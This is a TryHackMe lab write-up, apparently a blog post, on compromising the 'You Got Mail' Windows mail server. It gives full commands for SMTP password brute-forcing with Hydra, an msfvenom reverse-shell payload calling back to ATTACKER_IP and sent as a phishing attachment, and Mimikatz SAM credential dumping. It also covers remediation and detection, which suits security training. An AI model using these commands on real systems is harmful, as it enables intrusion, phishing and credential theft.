---
title: "TryHackMe: You Got Mail"
date: 2026-06-16 23:45:00 +0200
categories: [TryHackMe]
tags:
  - windows
  - mail
  - smtp
  - phishing
  - password-attacks
  - reverse-shell
  - mimikatz
  - credential-dumping
  - hmailserver
description: >-
  You Got Mail chains passive public reconnaissance, weak SMTP credentials,
  authenticated phishing, executable attachment execution, and credential
  dumping into full compromise of the Brick Mail host.
author: lenovolegion7
media_subpath: /images/tryhackme_you_got_mail
image:
  path: room_image.webp
  alt: "Original TryHackMe You Got Mail room artwork"
toc: true
comments: false
---

You Got Mail is a Windows mail-server challenge built around passive reconnaissance, weak mailbox authentication, phishing, and post-exploitation credential recovery. The validated path started with publicly exposed staff information, used SMTP authentication to compromise a mailbox, delivered an executable attachment, obtained a reverse shell as `wrohit`, and finished by recovering both the local user's password and the hMailServer Administrator Dashboard password.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe You Got Mail room card](room_card.webp){: w="303" h="271" .shadow }](https://tryhackme.com/room/yougotmail){: .center }

## Executive Summary

The target exposed hMailServer mail services together with several Windows management services:

```text
25/tcp    SMTP
110/tcp   POP3
143/tcp   IMAP
445/tcp   SMB
587/tcp   SMTP submission
3389/tcp  RDP
5985/tcp  WinRM
```

The validated compromise path was:

1. enumerate the mail and Windows management services;
2. perform passive reconnaissance against the public `brownbrick.co` website;
3. collect staff names and the email-address format;
4. generate a site-specific password list with CeWL;
5. identify a valid mailbox credential through SMTP AUTH testing;
6. use the compromised mailbox to send an executable attachment;
7. obtain a reverse shell as `BRICK-MAIL\wrohit`;
8. recover the user objective;
9. use the compromised Windows context to dump local SAM credential material;
10. crack the `wrohit` NTLM hash offline;
11. recover the hMailServer Administrator password hash from `hMailServer.INI`;
12. crack the weak hMailServer Administrator Dashboard password offline.

> **Result:** A weak mailbox password and trusted internal mail delivery were converted into Windows code execution, local credential dumping, and recovery of both user and hMailServer administrative credentials.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe laboratory target.

Active testing was limited to the assigned host. Reconnaissance against `brownbrick.co` was passive only, and other domains or TLDs were out of scope.

The source report records full objective completion without claiming persistence or testing outside the lab environment.

## Initial Enumeration

TCP enumeration identified hMailServer and Windows management services:

```console
$ nmap \
  -p25,110,143,445,587,3389,5985 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

Representative observations:

```text
25/tcp    SMTP     hMailServer smtpd
110/tcp   POP3     hMailServer pop3d
143/tcp   IMAP     hMailServer imapd
587/tcp   SMTP     hMailServer smtpd
3389/tcp  RDP      Microsoft Terminal Services
5985/tcp  WinRM    Microsoft HTTPAPI / WSMan
```

The mail-service banner disclosed the Windows hostname:

```text
BRICK-MAIL
```

SMTP AUTH LOGIN support was available on ports `25` and `587`.

## Passive Website Reconnaissance

The public website was reviewed passively to identify staff names and the email-address structure.

The source report lists the following addresses used for subsequent in-scope SMTP authentication testing:

```text
fstamatis@brownbrick.co
pcathrine@brownbrick.co
tchikondi@brownbrick.co
lhedvig@brownbrick.co
wrohit@brownbrick.co
oaurelius@brownbrick.co
```

A custom wordlist was generated from the public site:

```console
$ cewl \
  --lowercase \
  https://brownbrick.co/ \
  > mail/passwords.txt
```

The resulting list contained site-specific terms and staff-related vocabulary.

## Mailbox Credential Discovery

SMTP AUTH testing was performed against the target mail server:

```console
$ hydra \
  -L mail/emails.txt \
  -P mail/passwords.txt \
  smtp://TARGET_IP:587 \
  -t 16 \
  -V \
  -f
```

A valid mailbox credential was recovered:

```text
lhedvig@brownbrick.co : [REDACTED]
```

The plaintext password is intentionally not published.

This provided an authenticated internal-mail foothold.

## Authenticated Phishing and Code Execution

A Windows reverse-shell executable was generated for the authorized lab:

```console
$ msfvenom \
  -p windows/x64/shell_reverse_tcp \
  LHOST=ATTACKER_IP \
  LPORT=443 \
  -f exe \
  -o phish/shell.exe
```

The attachment was sent from the compromised mailbox to the discovered recipient list.

Representative delivery flow:

```console
$ sendemail \
  -f "lhedvig@brownbrick.co" \
  -t "wrohit@brownbrick.co" \
  -u "Document review" \
  -m "Please review the attached file." \
  -a phish/shell.exe \
  -s "TARGET_IP:587" \
  -xu "lhedvig@brownbrick.co" \
  -xp "[REDACTED]" \
  -o tls=no
```

The attachment was executed and produced a reverse shell as:

```text
BRICK-MAIL\wrohit
```

The user objective was located at:

```text
C:\Users\wrohit\Desktop\flag.txt
```

Its value is published only as:

```text
THM{[REDACTED]}
```

## Credential Dumping

The compromised `wrohit` context was sufficient to run Mimikatz, enable debug privileges, elevate to a SYSTEM token, and dump local SAM hashes.

Representative lab workflow:

```console
C:\> mimikatz.exe \
  "privilege::debug" \
  "token::elevate" \
  "lsadump::sam" \
  "exit"
```

The source report confirms extraction of the local `wrohit` NTLM hash. The hash itself is intentionally not published:

```text
wrohit NTLM: [REDACTED]
```

Offline cracking then recovered the `wrohit` plaintext password:

```console
$ john \
  --format=NT \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  loot/wrohit_ntlm.txt
```

Recovered credential:

```text
wrohit : [REDACTED]
```

## hMailServer Administrator Credential Recovery

The hMailServer configuration file contained a raw MD5 Administrator password hash:

```text
C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI
```

Relevant configuration:

```text
[Security]
AdministratorPassword=[REDACTED]
```

The source report confirms that the value was an unsalted MD5 hash and cracked immediately with a standard wordlist.

Representative offline recovery:

```console
$ john \
  --format=raw-md5 \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  loot/hmail_admin_md5.txt
```

Recovered hMailServer Administrator Dashboard password:

```text
[REDACTED]
```

## Findings

### F-01 - Weak Mailbox Password Discoverable from Public Website Wordlist

- **Severity:** High
- **Affected service:** SMTP AUTH
- **Compromised mailbox:** `lhedvig@brownbrick.co`
- **Impact:** authenticated internal-mail access

A site-themed password appeared in a CeWL-derived list generated from publicly available website content and was accepted by SMTP authentication.

**Remediation:**

- require long random passwords or strong passphrases;
- enable MFA where supported;
- enforce rate limiting and account lockout;
- screen passwords against organization-specific terms;
- monitor repeated SMTP authentication failures.

### F-02 - Executable Attachment Execution Resulted in Code Execution

- **Severity:** Critical
- **Affected workflow:** authenticated email delivery
- **Compromised identity:** `BRICK-MAIL\wrohit`
- **Impact:** remote command execution through user attachment execution

An executable attachment sent from a valid internal mailbox was accepted and executed, producing a reverse shell.

**Remediation:**

- block executable attachments;
- detonate attachments in a sandbox;
- enforce application control such as WDAC or AppLocker;
- improve phishing-resistant user training;
- monitor executable launches originating from mail-storage locations.

### F-03 - Over-Privileged User Allowed Credential Dumping

- **Severity:** Critical
- **Affected user:** `wrohit`
- **Impact:** local SAM credential recovery and SYSTEM token use

The compromised user context could enable debug privileges, elevate to SYSTEM, and dump local account hashes.

**Remediation:**

- remove unnecessary administrator rights;
- restrict `SeDebugPrivilege`;
- enable LSA protection and Credential Guard where compatible;
- monitor credential-dumping behavior;
- prevent execution of unsigned administrative tooling.

### F-04 - Weak hMailServer Administrator Password Stored as Crackable MD5

- **Severity:** High
- **Affected file:** `hMailServer.INI`
- **Impact:** recovery of the hMailServer administrative password

The configuration stored the Administrator password as unsalted MD5, and the password itself was weak enough to crack immediately.

**Remediation:**

- rotate the hMailServer Administrator password to a high-entropy value;
- restrict access to `hMailServer.INI`;
- restrict hMailServer administration to a management network;
- use stronger password-storage mechanisms where supported.

### F-05 - Broadly Exposed Windows and Mail Services

- **Severity:** Medium
- **Affected services:** SMTP, POP3, IMAP, SMB, RDP, WinRM
- **Impact:** increased remote authentication and post-compromise attack surface

Multiple mail and administrative services were reachable from the attacker network. Mail authentication was directly abused, while SMB, RDP, and WinRM increased the available post-compromise options.

**Remediation:**

- restrict RDP, SMB, and WinRM to dedicated management networks;
- expose only mail services required for business use;
- enforce TLS and strong authentication;
- monitor failed logons and suspicious remote-management access.

## Security Impact

The demonstrated chain resulted in full compromise of the Brick Mail host's user and credential boundary.

An attacker with equivalent access could:

- derive likely mailbox passwords from public company content;
- authenticate to the mail service;
- abuse trusted internal mail delivery for phishing;
- obtain Windows command execution as a local user;
- access the user's files and challenge objective;
- dump local SAM credentials;
- recover local account plaintext passwords offline;
- recover the hMailServer Administrator Dashboard password;
- use broadly exposed management services after credential compromise.

The most important control failures were weak mailbox authentication, executable attachment handling, excessive local privilege, and weak administrative password storage.

## Detection Opportunities

Useful monitoring controls include:

- monitor repeated SMTP AUTH failures and password-guessing patterns;
- alert on successful mail authentication from unusual sources;
- detect executable attachments entering or leaving the environment;
- monitor process creation from mail-client attachment paths;
- alert on reverse-shell-like outbound connections;
- detect Mimikatz execution and `SeDebugPrivilege` enablement;
- monitor SYSTEM token impersonation and SAM access;
- alert on reads of `hMailServer.INI` by unexpected users or processes;
- detect raw-MD5 administrative password usage during configuration review;
- monitor RDP, SMB, and WinRM authentication following mailbox compromise.

## Remediation Priorities

1. Rotate the compromised mailbox, `wrohit`, and hMailServer Administrator credentials.
2. Remove local administrator rights from regular mail users.
3. Block executable email attachments.
4. Deploy attachment sandboxing and application control.
5. Enable MFA where supported for mail access.
6. Add SMTP AUTH rate limiting and account lockout.
7. Restrict RDP, SMB, and WinRM to management networks.
8. Harden hMailServer administration and restrict access to `hMailServer.INI`.
9. Enable endpoint controls for credential dumping and suspicious process execution.
10. Conduct recurring phishing simulations and attachment-handling training.

## Retest Plan

1. Confirm the previous mailbox password no longer authenticates to SMTP, POP3, or IMAP.
2. Verify organization-specific terms are rejected by password policy.
3. Confirm repeated SMTP password guessing is rate-limited and detected.
4. Verify executable attachments are blocked or quarantined.
5. Confirm attachment execution cannot produce an unrestricted shell.
6. Verify ordinary mail users cannot enable debug privileges or impersonate SYSTEM.
7. Confirm Mimikatz-style SAM dumping is blocked or detected.
8. Verify the previous `wrohit` NTLM material and password no longer provide access.
9. Confirm `hMailServer.INI` is restricted to required administrative principals.
10. Verify the hMailServer Administrator password has been rotated to a strong value.
11. Confirm management services are inaccessible from ordinary attacker-facing networks.
12. Verify the previous attack chain no longer reaches credential dumping or hMailServer administrative compromise.

## Lessons Learned

You Got Mail demonstrates how public information, weak authentication, human trust, and excessive local privilege can combine into a complete mail-server compromise.

Passive reconnaissance supplied the staff and password vocabulary. Weak SMTP credentials converted that information into authenticated internal-mail access. Executable attachment handling then converted mailbox compromise into Windows code execution, while local privilege and weak credential storage exposed both user and application-administrator secrets.

The strongest defensive response is to treat mail authentication, phishing resistance, endpoint privilege, credential storage, and management-service exposure as one connected security boundary rather than separate controls.
